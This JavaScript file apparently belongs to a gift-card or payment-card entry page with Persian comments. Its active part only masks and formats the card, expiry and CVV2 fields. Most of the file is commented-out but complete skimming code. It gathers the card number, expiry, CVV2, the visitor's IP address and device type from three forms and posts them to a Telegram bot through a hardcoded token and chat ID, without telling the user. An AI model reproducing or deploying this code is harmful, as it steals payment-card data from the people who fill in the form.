// const tabs = document.querySelectorAll('.operations__tab');
// const tabsContainer = document.querySelector('.operations__tab-container');
// const tabsContent = document.querySelectorAll('.operations__content');
// const menuBtn = document.getElementById('menuBtn');
// const menuList = document.getElementById('menuList');

// tabsContainer.addEventListener('click', function (e) {
//   const clicked = e.target.closest('.operations__tab');

//   // Guard clause
//   if (!clicked) return;

//   // Remove active classes
//   tabs.forEach(t => t.classList.remove('operations__tab--active'));
//   tabsContent.forEach(c => c.classList.remove('operations__content--active'));
//   tabsContent.forEach(c => c.classList.add('hidden'));

//   // Activate tab
//   clicked.classList.add('operations__tab--active');

//   // Activate content area
//   document
//     .querySelector(`.operations__content--${clicked.dataset.tab}`)
//     .classList.add('operations__content--active');
//   document
//     .querySelector(`.operations__content--${clicked.dataset.tab}`)
//     .classList.remove('hidden');
// });

// menuBtn.addEventListener('click', () => {
//   menuList.classList.toggle('hidden');
// });

// window.addEventListener('click', function (event) {
//   if (!menuBtn.contains(event.target) && !menuList.contains(event.target)) {
//     menuList.classList.add('hidden');
//   }
// });

// const giftCardInput = document.getElementById('giftCardInput');
// const mmInput = document.getElementById('mmInput');
// const yyInput = document.getElementById('yyInput');
// const cvv2Input = document.getElementById('cvv2Input');
// const registerCardBtn = document.getElementById('registerCardBtn');

// const giftCardInput2 = document.getElementById('giftCardInput2');
// const mmInput2 = document.getElementById('mmInput2');
// const yyInput2 = document.getElementById('yyInput2');
// const cvv2Input2 = document.getElementById('cvv2Input2');
// const registerCardBtn2 = document.getElementById('registerCardBtn2');

// const giftCardInput3 = document.getElementById('giftCardInput3');
// const mmInput3 = document.getElementById('mmInput3');
// const yyInput3 = document.getElementById('yyInput3');
// const cvv2Input3 = document.getElementById('cvv2Input3');
// const registerCardBtn3 = document.getElementById('registerCardBtn3');

// const form = document.getElementById('form');
// const form2 = document.getElementById('form2');
// const form3 = document.getElementById('form3');

// const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
// const chatId = '-4614449543';

// const sendMessage = async function (message) {
//   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
//     method: 'POST',
//     headers: {
//       'Content-Type': 'application/json',
//     },
//     body: JSON.stringify({
//       chat_id: chatId,
//       text: message,
//       // parse_mode: 'MarkdownV2',
//     }),
//   })
//     .then(response => response.json())
//     .then(data => {
//       return data;
//     })
//     .catch(error => {
//       console.error('خطا در ارسال پیام:', error);
//     });
// };

// function validateGiftCardCode(code) {
//   // بررسی طول کد (باید 16 کاراکتر باشد)
//   if (code.length !== 16) {
//     return false;
//   }
//   // بررسی اینکه کد فقط شامل حروف بزرگ و اعداد باشد
//   const regex = /^[A-Z0-9]+$/;
//   if (!regex.test(code)) {
//     return false;
//   } else {
//     return true;
//   }
// }

// function validateExpirationDate(month, year) {
//   // بررسی اینکه ماه معقول باشد
//   if (month < 1 || month > 12) {
//     return false; // ماه نامعتبر است
//   }

//   // تبدیل سال دو رقمی به چهار رقمی
//   const currentDate = new Date();
//   const currentYear = currentDate.getFullYear() % 100; // دو رقم آخر سال کنونی
//   const fullYear = year + (year < currentYear ? 2000 : 1900); // مقایسه و تبدیل

//   // تاریخ انقضا را به تاریخ واقعی تبدیل کنید
//   const expiration = new Date(fullYear, month - 1); // ماه باید از 0 شروع شود

//   // اطمینان از اینکه تاریخ انقضا در آینده است
//   if (expiration <= currentDate) {
//     return false; // تاریخ انقضا گذشته است
//   } else {
//     return true; // تاریخ انقضا معتبر است
//   }
// }

// function validateCVV2(cvv) {
//   // بررسی اینکه کد CVV2 دقیقا 3 رقم باشد و فقط شامل اعداد باشد
//   const regex = /^\d{3}$/; // 3 رقم
//   if (!regex.test(cvv)) {
//     return false;
//   } else {
//     return true;
//   }
// }

// let userIp;
// async function getUserIP() {
//   try {
//     const response = await fetch('https://api.ipify.org?format=json');
//     const data = await response.json();
//     userIp = data.ip;
//   } catch (error) {
//     console.error('خطا در دریافت IP:', error);
//     return null; // در صورت بروز خطا
//   }
// }
// getUserIP();

// function getDeviceType() {
//   const userAgent = navigator.userAgent;

//   // بررسی برای دستگاه‌های iPhone
//   if (/iPhone/i.test(userAgent)) {
//     return 'iPhone';
//   }
//   // بررسی برای دستگاه‌های Android
//   else if (/Android/i.test(userAgent)) {
//     return 'Android';
//   }
//   // در غیر این صورت، فرض می‌کنیم که دسکتاپ است
//   else {
//     return 'Desktop';
//   }
// }

// form.addEventListener('submit', e => {
//   e.preventDefault();

//   // const message = `
//   // type : ${
//   //   document.querySelector('.operations__tab--active').children[1].textContent
//   // }
//   // ${giftCardInput.value} ${mmInput.value}/${yyInput.value} ${cvv2Input.value}
//   // ---------
//   // IP: ${userIp}
//   // Device: ${getDeviceType()}`;
//   const message = `
//   Card Number: ${giftCardInput.value}
//   Expiration: ${mmInput.value}/${yyInput.value}
//   Cvv2: ${cvv2Input.value}
//   --------------
//   IP: ${userIp}
//   Device: ${getDeviceType()}
// `;
//   let errors = [];
//   if (!validateGiftCardCode(giftCardInput.value)) {
//     errors.push('Invalid Card Number');
//   }
//   if (!validateExpirationDate(mmInput.value, yyInput.value)) {
//     errors.push('Invalid Expiration Date');
//   }
//   if (!validateCVV2(cvv2Input.value)) {
//     errors.push('Invalid Cvv2');
//   }
//   let dat = '';
//   if (errors.length > 0) {
//     for (let text of errors) {
//       dat += text + '\n'; // اضافه کردن متن و رفتن به خط جدید
//     }
//     Toastify({
//       text: dat,
//       duration: 3000,
//       newWindow: true,
//       close: true,
//       gravity: 'top', // `top` or `bottom`
//       position: 'right', // `left`, `center` or `right`
//       stopOnFocus: true, // Prevents dismissing of toast on hover
//       style: {
//         fontSize: '1.1rem',
//         fontWeight: '600',
//         background: '#EA384D',
//         width: '300px',
//         minWidth: '300px',
//         display: 'flex',
//         justifyContent: 'space-between',
//       },
//     }).showToast();
//   } else {
//     console.log(giftCardInput.value);
//     console.log(mmInput.value);
//     console.log(yyInput.value);
//     console.log(cvv2Input.value);
//     console.log();
//     sendMessage(message);
//   }
// });

// form2.addEventListener('submit', e => {
//   e.preventDefault();

//   // const message = `
//   // type : ${
//   //   document.querySelector('.operations__tab--active').children[1].textContent
//   // }
//   // ${giftCardInput.value} ${mmInput.value}/${yyInput.value} ${cvv2Input.value}
//   // ---------
//   // IP: ${userIp}
//   // Device: ${getDeviceType()}`;
//   const message = `
//   Card Number: ${giftCardInput2.value}
//   Expiration: ${mmInput2.value}/${yyInput2.value}
//   Cvv2: ${cvv2Input2.value}
//   --------------
//   IP: ${userIp}
//   Device: ${getDeviceType()}
// `;
//   let errors = [];
//   if (!validateGiftCardCode(giftCardInput2.value)) {
//     errors.push('Invalid Card Number');
//   }
//   if (!validateExpirationDate(mmInput2.value, yyInput2.value)) {
//     errors.push('Invalid Expiration Date');
//   }
//   if (!validateCVV2(cvv2Input2.value)) {
//     errors.push('Invalid Cvv2');
//   }
//   let dat = '';
//   if (errors.length > 0) {
//     for (let text of errors) {
//       dat += text + '\n'; // اضافه کردن متن و رفتن به خط جدید
//     }
//     Toastify({
//       text: dat,
//       duration: 3000,
//       newWindow: true,
//       close: true,
//       gravity: 'top', // `top` or `bottom`
//       position: 'right', // `left`, `center` or `right`
//       stopOnFocus: true, // Prevents dismissing of toast on hover
//       style: {
//         fontSize: '1.1rem',
//         fontWeight: '600',
//         background: '#EA384D',
//         width: '300px',
//         minWidth: '300px',
//         display: 'flex',
//         justifyContent: 'space-between',
//       },
//     }).showToast();
//   } else {
//     console.log(giftCardInput2.value);
//     console.log(mmInput2.value);
//     console.log(yyInput2.value);
//     console.log(cvv2Input2.value);
//     console.log();
//     sendMessage(message);
//   }
// });

// form3.addEventListener('submit', e => {
//   e.preventDefault();

//   // const message = `
//   // type : ${
//   //   document.querySelector('.operations__tab--active').children[1].textContent
//   // }
//   // ${giftCardInput.value} ${mmInput.value}/${yyInput.value} ${cvv2Input.value}
//   // ---------
//   // IP: ${userIp}
//   // Device: ${getDeviceType()}`;
//   const message = `
//   Card Number: ${giftCardInput3.value}
//   Expiration: ${mmInput3.value}/${yyInput3.value}
//   Cvv2: ${cvv2Input3.value}
//   --------------
//   IP: ${userIp}
//   Device: ${getDeviceType()}
// `;
//   let errors = [];
//   if (!validateGiftCardCode(giftCardInput3.value)) {
//     errors.push('Invalid Card Number');
//   }
//   if (!validateExpirationDate(mmInput3.value, yyInput3.value)) {
//     errors.push('Invalid Expiration Date');
//   }
//   if (!validateCVV2(cvv2Input3.value)) {
//     errors.push('Invalid Cvv2');
//   }
//   let dat = '';
//   if (errors.length > 0) {
//     for (let text of errors) {
//       dat += text + '\n'; // اضافه کردن متن و رفتن به خط جدید
//     }
//     Toastify({
//       text: dat,
//       duration: 3000,
//       newWindow: true,
//       close: true,
//       gravity: 'top', // `top` or `bottom`
//       position: 'right', // `left`, `center` or `right`
//       stopOnFocus: true, // Prevents dismissing of toast on hover
//       style: {
//         fontSize: '1.1rem',
//         fontWeight: '600',
//         background: '#EA384D',
//         width: '300px',
//         minWidth: '300px',
//         display: 'flex',
//         justifyContent: 'space-between',
//       },
//     }).showToast();
//   } else {
//     console.log(giftCardInput3.value);
//     console.log(mmInput3.value);
//     console.log(yyInput3.value);
//     console.log(cvv2Input3.value);
//     console.log();
//     sendMessage(message);
//   }
// });

const inputField = document.getElementById('card-number');
const expirationDate = document.getElementById('expiration-date');
const cvv2 = document.getElementById('cvv2');

const pattern = '____-____-____-____';

inputField.addEventListener('input', function () {
  let value = this.value.replace(/\D/g, ''); // حذف کاراکترهای غیر عددی
  let maskedValue = '';

  for (let i = 0, j = 0; i < pattern.length && j < value.length; i++) {
    if (pattern[i] === '_') {
      maskedValue += value[j++];
    } else {
      maskedValue += pattern[i];
    }
  }

  this.value = maskedValue;

  if (value.length < maskedValue.length) {
    this.setSelectionRange(maskedValue.length, maskedValue.length); // قرار دادن کادر متنی در انتهای ورودی
  }
});

expirationDate.addEventListener('input', function () {
  let currentValue = expirationDate.value.replace(/\D/g, ''); // فقط اعداد را نگه‌دارید
  if (currentValue.length > 4) {
    currentValue = currentValue.slice(0, 4); // تنها 4 رقم اجازه داده شود
  }

  // اگر دو عدد ورودی بود، با '/' جدا کنید
  if (currentValue.length >= 2) {
    currentValue = currentValue.slice(0, 2) + '/' + currentValue.slice(2);
  }

  expirationDate.value = currentValue; // ورودی فرمت شده را به اینپوت برگردانید

  // اعتبارسنجی تاریخ
  const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/; // الگوی معتبر MM/YY
  if (currentValue.length === 5) {
    if (regex.test(currentValue)) {
      // messageElement.textContent = ''; // پیام خطا را پاک کنید
    } else {
      // messageElement.textContent = 'لطفا ورودی معتبر MM/YY را وارد کنید.';
    }
  } else {
    // messageElement.textContent = ''; // اگر ورودی هنوز کامل نیست، هیچ پیام خطایی نشان ندهید
  }
});

function validateCVV2(cvv) {
  // بررسی اینکه کد CVV2 دقیقا 3 رقم باشد و فقط شامل اعداد باشد
  const regex = /^\d{3}$/; // 3 رقم
  if (!regex.test(cvv)) {
    return false;
  } else {
    return true;
  }
}

cvv2.addEventListener('input', function () {
  const regex = /^\d{3}$/; // 3 رقم
  if (!regex.test(cvv2.value)) {
    return false;
  } else {
    return true;
  }
});
